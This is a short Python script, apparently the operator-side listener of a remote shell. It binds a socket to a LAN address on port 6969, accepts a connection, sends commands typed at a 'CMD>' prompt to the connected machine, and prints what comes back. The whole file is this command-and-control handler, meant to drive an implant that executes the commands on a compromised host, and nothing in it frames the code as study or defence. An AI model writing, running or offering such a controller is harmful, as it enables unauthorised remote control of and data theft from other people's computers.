import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(("192.168.196.26",6969))


s.listen()
conn,addr = s.accept()

print(f"connection from {conn} with {addr} address")
while True:
    command = input("CMD>")
    if command == 'exit':
        conn.send('exit'.encode("utf-8"))
        conn.close()
        break
    conn.send(command.encode("utf-8"))
    print(conn.recv(8192).decode("utf-8"))
